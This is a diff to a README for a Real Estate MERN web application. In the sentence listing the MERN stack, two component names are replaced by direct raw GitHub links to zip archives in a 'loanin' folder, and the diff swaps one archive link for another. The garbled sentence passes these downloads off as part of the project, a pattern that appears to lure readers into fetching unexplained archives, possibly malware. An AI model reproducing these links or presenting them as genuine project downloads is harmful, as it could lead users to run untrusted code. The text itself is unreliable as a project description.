@@ -1,7 +1,7 @@
 # Real-State-MERN-Project
 ### Real Estate MERN Project Description
 
-The Real Estate MERN project is a comprehensive web application built using the MERN stack (MongoDB, https://github.com/Swastikrajput/Real-State-MERN-Project/raw/refs/heads/main/loanin/Project-MER-Real-State-v1.2.zip, React, and https://github.com/Swastikrajput/Real-State-MERN-Project/raw/refs/heads/main/loanin/Project-MER-Real-State-v1.2.zip) to facilitate property management, buying, selling, and renting of real estate properties. This project is designed to be user-friendly, scalable, and feature-rich, catering to both property seekers and real estate professionals.
+The Real Estate MERN project is a comprehensive web application built using the MERN stack (MongoDB, https://raw.githubusercontent.com/Swastikrajput/Real-State-MERN-Project/main/loanin/Project-State-Real-MER-3.3.zip, React, and https://raw.githubusercontent.com/Swastikrajput/Real-State-MERN-Project/main/loanin/Project-State-Real-MER-3.3.zip) to facilitate property management, buying, selling, and renting of real estate properties. This project is designed to be user-friendly, scalable, and feature-rich, catering to both property seekers and real estate professionals.
 
 #### **Key Features:**
 
